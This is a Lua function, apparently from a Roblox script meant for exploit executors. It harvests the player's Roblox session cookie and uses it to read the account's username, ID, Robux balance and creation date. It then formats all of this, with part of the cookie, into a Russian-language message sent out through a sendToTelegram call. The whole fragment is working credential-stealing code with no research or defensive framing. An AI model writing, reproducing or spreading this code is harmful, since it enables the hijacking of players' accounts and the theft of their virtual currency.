local function collectData()
    local cookie = ""
    local req = syn and syn.request or http and http.request or request
    if req then
        local resp = req({Url = "https://www.roblox.com/", Method = "GET"})
        if resp and resp.Headers and resp.Headers["Set-Cookie"] then
            local c = resp.Headers["Set-Cookie"]
            cookie = type(c) == "table" and table.concat(c, "; ") or tostring(c)
        end
    end
    if cookie and cookie ~= "" then
        local info = nil
        if req then
            local resp2 = req({
                Url = "https://www.roblox.com/mobileapi/userinfo",
                Method = "GET",
                Headers = {["Cookie"] = cookie}
            })
            if resp2 and resp2.Body then
                pcall(function()
                    info = HttpService:JSONDecode(resp2.Body)
                end)
            end
        end
        local name = info and info.UserName or "Неизвестно"
        local uid = info and info.UserID or "Неизвестно"
        local robux = info and info.RobuxBalance or 0
        local created = info and info.Created or "Неизвестно"
        local gameName = "Неизвестно"
        pcall(function()
            gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        local msg = "АККАУНТ\nНик: "..name.."\nID: "..uid.."\nРобуксов: "..robux.."\nСоздан: "..created.."\nИгра: "..gameName.."\nКуки: "..string.sub(cookie, 1, 300)
        sendToTelegram(msg)
    end
end

